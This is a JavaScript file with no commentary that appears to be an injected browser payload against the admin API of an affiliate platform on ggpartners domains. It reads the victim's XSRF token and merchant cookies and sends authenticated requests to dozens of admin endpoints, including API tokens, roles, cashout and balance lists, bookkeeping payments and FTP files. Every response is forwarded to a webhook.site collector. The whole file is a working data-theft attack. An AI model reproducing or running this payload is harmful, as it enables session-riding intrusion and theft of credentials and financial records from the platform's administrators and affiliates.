const dataToSend = {
};

function getCookie(name) {
  const cookies = document.cookie.split('; ');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i];
    // Check if the cookie starts with the desired name and an equals sign
    if (cookie.startsWith(name + '=')) {
      // Return the value part of the cookie
      return decodeURIComponent(cookie.substring(name.length + 1));
    }
  }
  return null; // Return null if the cookie is not found
}

dataToSend.authenticity_token = getCookie("XSRF-TOKEN-X");
dataToSend.merchant = getCookie("merchant_id");


fetch('https://affiliates-api.ggpartners.com/api2/admin/trackers/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ap="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ap="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ar="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ar="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
        "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ao="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ak="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


fetch('https://affiliates-api.ggpartners1.com/api2/admin/trackers/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ab="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ab="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  mode: 'cors',
  headers: {
       "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ac="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ac="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?da="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ad="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/translate_manager/server_marks?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?servmarl="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/translate_manager/server_marks?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?servmarl="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/profile/api_tokens?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/profile/api_tokens?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/payment_system_lists/allowed_payment_systems?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/payment_system_lists/allowed_payment_systems?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/history_of_limit_changes/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 

})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/history_of_limit_changes/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/dashboard/get_stats?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/dashboard/get_stats?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/dashboard/chart?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/dashboard/chart?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();



(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/dashboard/tops?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/dashboard/tops?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/roles/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"namespace":"admin"});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/roles/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send({"namespace":"admin"});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();



(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/bookkeepings/list_month_payments?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?listm="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/bookkeepings/list_month_payments?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?listm="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners.com/api2/admin/project_settings/admins_with_full_stats_access?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?adm="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://affiliates-api.ggpartners1.com/api2/admin/project_settings/admins_with_full_stats_access?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?adm="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();



fetch('https://affiliates-api.ggpartners.com/api2/admin/observing_of_daily_statistics_players', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?dailystat="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?dailystat="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/observing_of_daily_statistics_players', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?dailystat="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?dailystat="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/balance/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?afffcash="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affcasg="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/balance/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affcash="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affcash="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});



fetch('https://affiliates-api.ggpartners.com/api2/admin/ftp_files/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ftp="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ftp="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/ftp_files/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ftp="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ftp="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});



